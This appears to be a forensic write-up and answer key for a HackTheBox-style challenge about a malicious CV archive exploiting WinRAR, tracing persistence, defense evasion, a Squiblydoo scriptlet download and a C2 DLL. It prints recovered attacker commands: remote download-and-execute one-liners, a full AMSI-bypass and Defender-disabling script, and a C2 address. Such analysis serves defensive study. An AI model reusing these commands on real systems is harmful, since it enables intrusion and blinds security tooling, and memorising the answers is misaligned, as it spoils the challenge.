---
title: "CVenom"
description: "It's hiring season at Engineers Spark, and HR analyst Mimi spends her afternoons reviewing candidate archives sent through the recruitment portal. Around 3 PM, she settles in for her end-of-day CV review. Three new submissions sit on her desktop. She extracts each one, opens the PDFs in Microsoft Edge, and moves on. Nothing looks unusual. At the end of her shift, she shuts down the workstation. The next morning, minutes after she powers the machine back on, the IT security team flags unusual outbound connections from her workstation. Something happened yesterday."
publishDate: "2026-11-14"
tags: ["forensic", "medium", "malware", "htb"]
section: "blue"
draft: False
coverImage:
  src: "/images/cvenom/logo.png"
  alt: "thumbnail"
---
# Walkthrough
![map](/images/cvenom/map.png)
## 1. Initial Access
As mentioned in description, the main reason leading to unusual activity coming from these CVs. One of the CV archives is `Ayoub_Hedri.rar` revealed an NTFS ADS containing a path traversal sequence that targeted the Windows Startup folder. It relates to `CVE-2025-8088`
![evident_tree](/images/cvenom/evident_tree.png)
## 2. Persistence and PowerShell Execution
Extracting the malicious archive placed `EdgeUpdate.lnk` in the shared `Startup` folder, allowing it to run when the victim next logged on.<br> Since the shortcut was not available as a standalone file in the collected evidence, I examined the PowerShell event logs to investigate what it launched. The logs revealed the following obfuscated command.
![evtx](/images/cvenom/evtx.png) 
```powershell
HostApplication=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -w h -ep bypass -c $k=90;$e='Ex8CchMIF3p9Mi4uKilgdXUoOy10PTMuMi84Lyk/KDk1NC4/NC50OTU3dSk0andqLSMjdR0/LikvPTsOPzQpMjV1NzszNHUpOyM1NDsoO3QqKWt9c2EJLjsoLncJNj8/Knp3KXpvYSg/PSksKGloenUpenU0enUvenUzYDIuLipgdXVrbWhrb2JrbGhtdS8qPjsuP3QpOS56KTkoNTgwdD42Ng==';$b=[Convert]::FromBase64String($e);$d='';foreach($x in $b){$d+=[char]($x-bxor$k)};iex $d
```
Decoding the `Base64` string and applying `XOR` with the key `90` (0x5A) revealed the following commands:
```powershell
IEX(IRM 'https://raw.githubusercontent.com/sn0-0wyy/GetsugaTensho/main/sayonara.ps1');
Start-Sleep -s 5;
regsvr32 /s /n /u /i:http://1721581627/update.sct scrobj.dll
```
## 3. Defense Evasion
The first command downloaded `sayonara.ps1` using `Invoke-RestMethod` and executed its contents using `Invoke-Expression`. <br>
I then examined the PowerShell log and found an Event ID `4104` containing the script:
![image](/images/cvenom/psscript.png)

```powershell
ScriptBlockText: Set-PSReadLineOption -HistorySaveStyle SaveNothing, S`eT-It`em ( 'V'+'aR' + 'IA' + (("{1}{0}"-f'1','blE:')+'q2') + ('uZ'+'x') ) ( [TYpE]( "{1}{0}"-F'F','rE' ) ) ; ( Get-varI`A`BLE ( ('1Q'+'2U') +'zX' ) -VaL )."A`ss`Embly"."GET`TY`Pe"(( "{6}{3}{1}{4}{2}{0}{5}" -f('Uti'+'l'),'A',('Am'+'si'),(("{0}{1}" -f '.M','an')+'age'+'men'+'t.'),('u'+'to'+("{0}{2}{1}" -f 'ma','.','tion')),'s',(("{1}{0}"-f 't','Sys')+'em') ) )."g`etf`iElD"( ( "{0}{2}{1}" -f('a'+'msi'),'d',('I'+("{0}{1}" -f 'ni','tF')+("{1}{0}"-f 'ile','a')) ),( "{2}{4}{0}{1}{3}" -f ('S'+'tat'),'i',('Non'+("{1}{0}" -f'ubl','P')+'i'),'c','c,' ))."sE`T`VaLUE"( ${n`ULl},${t`RuE} ), [Reflection.Assembly]::"l`o`AdwIThPa`Rti`AlnamE"(('S'+'ystem'+'.C'+'ore'))."g`E`TTYPE"(('Sys'+'tem.Di'+'agno'+'stics.Event'+'i'+'ng.EventProv'+'i'+'der'))."gET`FI`eLd"(('m'+'_'+'enabled'),('NonP'+'ubl'+'ic'+',Instance'))."seTVa`l`Ue"([Ref]."a`sSem`BlY"."gE`T`TyPE"(('Sys'+'tem'+'.Mana'+'ge'+'ment.Aut'+'o'+'mation.Tracing.'+'PSEtwLo'+'g'+'Pro'+'vi'+'der'))."gEtFIe`Ld"(('e'+'tw'+'Provid'+'er'),('N'+'o'+'nPu'+'b'+'lic,Static'))."gE`Tva`lUe"($null),0), New-Item -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging" -Force; New-Item -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ModuleLogging" -Force; Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging" -Name "EnableScriptBlockLogging" -Value 0 -Force; Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ModuleLogging" -Name "EnableModuleLogging" -Value 0 -Force, $null = reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v EnableLUA /t REG_DWORD /d 0 /f 2&gt;$null, Set-MpPreference -DisableRealtimeMonitoring $true -ErrorAction SilentlyContinue, Set-MpPreference -DisableIOAVProtection $true -ErrorAction SilentlyContinue, Set-MpPreference -DisableBehaviorMonitoring $true -ErrorAction SilentlyContinue, Set-MpPreference -DisableBlockAtFirstSeen $true -ErrorAction SilentlyContinue, Set-MpPreference -DisableEmailScanning $true -ErrorAction SilentlyContinue, Set-MpPreference -DisableScriptScanning $true -ErrorAction SilentlyContinue, Add-MpPreference -ExclusionPath $env:TEMP -ErrorAction SilentlyContinue, Add-MpPreference -ExclusionPath "$env:USERPROFILE\AppData\LocalLow\Microsoft\CryptnetUrlCache" -ErrorAction SilentlyContinue, 
```
This script use to eavde AV dectection through disable AV technique `DisableRealtimeMonitoring`, `DisableIOAVProtection`, `DisableBehaviorMonitoring`, `DisableBlockAtFirstSeen`, `DisableEmailScanning`, `DisableScriptScanning`. Finally, it added the user’s `Temp` directory and CryptnetUrlCache to Defender’s exclusion list:`Add-MpPreference -ExclusionPath $env:TEMP -ErrorAction SilentlyContinue`, `Add-MpPreference -ExclusionPath "$env:USERPROFILE\AppData\LocalLow\Microsoft\CryptnetUrlCache" ` <br>

## 4. Tracing the DLL Delivery and Execution
The next command invoked `regsvr32.exe` after a five-second delay:
```powershell
regsvr32 /s /n /u /i:http://1721581627/update.sct scrobj.dll
```
The command abused `regsvr32.exe` and legitimate DLL `scrobj.dll` to execute malicious scripts embedded inside Windows COM scriptlets `update.sct` downloaded from `http://102.157.64.59/update.sct`. These technique associating to `Squiblydoo` technique.
![relate](/images/cvenom/reg.png)
`Prefetch` analysis reveals that `certutil.exe` ran right after `regsvr32.exe`. Then I used `PECmd` to parse `CERTUTIL.EXE-28F1E0C1.pf`
![certutil](/images/cvenom/certutil.png)
![prefetch_certutil](/images/cvenom/prefetch_certutil.png)
:::note[Explanation]
`Certutil.exe` is a native Microsoft Windows command-line utility located in `C:\Windows\System32\certutil.exe`. It is officially designed for managing Windows Certificate Services, configuring Certificate Authorities (CAs), managing certificate stores, and verifying certificates, key pairs, and chains
:::
Howerver, it may be abused by attacker to download malicious script. For more information about the [Living-of-the-land](https://lolbas-project.github.io/lolbas/Binaries/Certutil/).
![metadata](/images/cvenom/metadata.png)
![content](/images/cvenom/content.png)
The `Prefetch` file referenced matching entries in the `MetaData` and `Content` directories of `CryptnetUrlCache`. The metadata contained the download URL `http://102.157.64.59/msgedgeupdate.dll`, while the corresponding content file contained the downloaded PE payload.<br>
![rundll32](/images/cvenom/rundll32.png)
![prefetch_rundll32](/images/cvenom/prefetch_rundll32.png)
`Prefetch` analysis also indicates that `rundll32.exe` was used to load the previously downloaded malicious DLL `C:\USERS\SOMEONE\APPDATA\LOCAL\TEMP\MSEDGEUPDATE.DLL`<br>
## 5. DLL Analysis and Shellcode Extraction
`Detect It Easy` identified the payload as `UPX-packed`. After unpacking it, I loaded the resulting DLL into `IDA` to reverse.
![die](/images/cvenom/die.png)
![die_1](/images/cvenom/die_1.png)
![ida_1](/images/cvenom/ida.png)
The function allocates 512 bytes of `RWX` memory, then copies 128 DWORDs from the embedded data at `unk_1F9FA4000` into that buffer. Then it decodes each DWORD by rotating it right by 13 bits, XOR it with `0xDEAD1899`, and reversing its byte order.<br>
Decypt 512 bytes from `unk_1F9FA4000` with the following script, we got shellcode.
```python
from pathlib import Path
import struct

def ror32(x, n):
    return ((x >> n) | (x << (32 - n))) & 0xFFFFFFFF

data = Path("encoded.bin").read_bytes()
assert len(data) == 512

decoded = bytearray()

for (value,) in struct.iter_unpack("<I", data):
    value = ror32(value, 13) ^ 0xDEAD1899
    decoded.extend(value.to_bytes(4, "big"))

Path("decoded.bin").write_bytes(decoded)
print(decoded[:64].hex(" "))
```
To analyze the decoded shellcode, I emulated it with `Speakeasy` and observed its connection attempt to `102.157.64.59:30404`
![speakeasy](/images/cvenom/speakeasy.png)

# Q&A
### Task 1: Identify the malicious file used as the initial infection vector. Provide its full path.
> C:\Users\someone\Desktop\CVs\Ayoub_Hedri.rar
### Task 2: The attacker combined path traversal with a technique to hide a malicious file inside the initially delivered file's structure. What is this Windows file system feature called?
>Alternate Data Streams
### Task 3: What is the name and version of the vulnerable application that was used by the victim and facilitated the initial access entry point for the attacker?
>WinRAR 7.11

![image](/images/cvenom/winrar.png)
`HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\WinRAR archiver`
### Task 4: What is the CVE identifier for the vulnerability exploited?
>CVE-2025-8088


### Task 5: What is the full path, including the filename, of the malicious file dropped for persistence?
>C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\EdgeUpdate.lnk


### Task 6: What is the full path of the legitimate application whose component the malicious file was masquerading as?
>C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe


### Task 7: The malicious persistence file facilitates post-exploitation. What is the XOR key value used during the execution of a script that provides the attacker with remote execution while evading defenses on the endpoint?
>0x5A

### Task 8: What is the full remote URL of the script executed to bypass and disable defenses?
>https://raw.githubusercontent.com/sn0-0wyy/GetsugaTensho/main/sayonara.ps1


### Task 9: When did the defense evasion script ran to suppress security features on the endpoint?
>2026-08-14 10:19:11


### Task 10: The script execution downloads an unconventional file to facilitate remote execution for the attacker. What is the remote IP address from where it is downloaded?
>102.157.64.59

hxxp[:]//1721581627/update.sct<br>
1721581627 --> 102.157.64.59
### Task 11: What is the name of the technique the attacker used in the previous question?
>Squiblydoo


### Task 12: During the final stage of the attack, the unconventional file drops a PE payload onto the system to establish remote shell access. What is the full remote URL from where the payload was fetched?
>http://102.157.64.59/msgedgeupdate.dll


### Task 13: What is the SHA-256 hash of the C2 payload?
>df881a2b494660ed5051806eab733ab564e3ec26c3cf42272d728bf1906d8c19

```shell
$ sha256sum 71344B6AF035A29EF8737533CE450492
df881a2b494660ed5051806eab733ab564e3ec26c3cf42272d728bf1906d8c19  71344B6AF035A29EF8737533CE450492
```

### Task 14: During the final stage, the C2 payload decrypts obfuscated shellcode. What is the XOR key used in the shellcode decryption?
>0xDEAD1899


### Task 15: What is the full C2 address from where the attacker maintains their remote access?
>102.157.64.59:30404


### Task 16: After establishing a C2 connection, the payload is deleted as part of the attack's cleanup. How long (in seconds) was the C2 payload active before it was deleted?
>537

To trace delete time I parse `$J` into `MFTECmd`.

:::note[Explanation]
The `USN Journal` (Update Sequence Number Journal) is the journaling functionality of NTFS. USN Journal maintains change logs made to the files on the NTFS and ReFS volumes. USN journal contains file or folder creation, deletion, and modification details. NTFS appends new records to the end of the USN Journal stream and it can be retrieved in the event of system crash or restore.
:::
![delete](/images/cvenom/delete.png)
![run](/images/cvenom/time.png)
the time malicious dll `msedgeupdate.dll` was deleted is `2026-08-14 10:28:20` and the time it first loaded and ran is `2026-08-14 10:19:23` through `rundll32.exe`.<br>
`28:20 - 19:23 --> 537 seconds` 